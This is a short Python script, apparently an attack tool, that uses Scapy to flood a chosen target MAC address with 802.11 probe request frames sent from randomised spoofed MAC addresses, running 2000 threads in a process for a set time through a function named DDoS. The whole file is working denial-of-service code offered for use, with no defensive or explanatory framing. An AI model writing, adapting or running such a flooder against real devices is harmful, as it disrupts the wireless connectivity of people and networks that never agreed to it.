from scapy.all import *
import multiprocessing
from scapy.layers.dot11 import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt

vendor = "b8:e8:56:"


class Var:
    interface = ''
    mac_to_attack = ''


def attack():
    randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
    frame = RadioTap() / Dot11(addr1=Var.mac_to_attack, addr2=randMAC,
                               addr3=randMAC) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
    sendp(frame, iface=Var.interface, loop=1, verbose=1)


def attack_pro():
    thread_pool = []
    number_of_threads = 2000
    try:
        for i in range(number_of_threads):
            t = threading.Thread(target=attack)
            t.start()
            thread_pool.append(t)
    except:
        pass


def DDoS(interface: str, mac_to_attack: str, t: int):
    Var.interface, Var.mac_to_attack = interface, mac_to_attack
    pro = multiprocessing.Process(target=attack_pro, args=())
    pro.start()
    time.sleep(t)
    pro.terminate()
